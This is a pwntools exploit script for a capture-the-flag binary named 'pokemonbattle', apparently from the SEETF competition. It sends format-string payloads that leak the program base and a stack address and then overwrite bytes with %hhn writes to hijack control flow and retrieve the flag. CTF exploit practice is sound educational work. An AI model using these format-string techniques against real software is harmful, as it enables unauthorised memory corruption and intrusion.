from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Binary filename
exe = './pokemonbattle'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

#connect nc fun.chall.seetf.sg 50003
def solve():
  io = start()

  io.sendlineafter(b"Choose a pokemon: ", b'%112c%7$hhn')

  io.recvuntil(b', I choose')
  io.sendlineafter(b"Choose a pokemon: ", b'%6$p-%8$p')

  leak_base, leak_stack = io.recvuntil(b', I choose')[:-10].split(b'-')
  elf.address = int(leak_base, 16) - 0x1100
  leak_stack = int(leak_stack, 16)
  log.success(f"elf base = {hex(elf.address)}, stack = {hex(leak_stack)}")

  io.sendlineafter(b"Choose a pokemon: ", f'%{(leak_stack&0xff) - 0x38}c%8$hhn'.encode())

  # io.recvuntil(b', I choose')
  io.sendlineafter(b"Choose a pokemon: ", b'%198c%16$hhn')

  # io.recvuntil(b', I choose')
  io.sendlineafter(b"Choose a pokemon: ", b'%104c%7$hhn')
  io.interactive()
  io.recvuntil(b"You blacked out!\n")
  flag = io.recvline()
  io.close()
  return flag

stop = b'SEE'
while(1):
  flag = solve()
  if(stop in flag):
    print(flag)
    break
